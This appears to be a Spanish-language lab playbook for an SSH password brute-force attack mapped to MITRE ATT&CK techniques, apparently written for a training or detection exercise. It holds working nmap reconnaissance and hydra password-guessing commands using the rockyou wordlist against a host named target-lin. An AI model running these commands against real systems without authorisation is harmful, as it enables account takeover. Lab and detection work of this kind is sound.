# Attack — SSH Brute Force

**TTP:** T1110.001 — Brute Force: Password Guessing  
**Herramienta:** Hydra  
**Desde:** kali-attacker  
**Hacia:** target-lin (SSH port 22)

---

## Reconocimiento previo

```bash
# Verificar que SSH está abierto
nmap -sV -p 22 target-lin

# Output esperado:
# 22/tcp open  ssh  OpenSSH 8.9p1
```

---

## Ejecución del ataque

```bash
# Brute force con hydra contra usuario 'ubuntu'
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://target-lin -t 4 -V

# Alternativa con lista de usuarios
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://target-lin -t 4
```

---

## TTPs mapeadas

| TTP | Nombre | Descripción |
|---|---|---|
| T1110.001 | Password Guessing | Intento de autenticación con lista de contraseñas |
| T1046 | Network Service Discovery | Nmap pre-ataque |
| T1078 | Valid Accounts | Objetivo: obtener credenciales válidas |

---

## Resultado

*(completar tras ejecutar)*
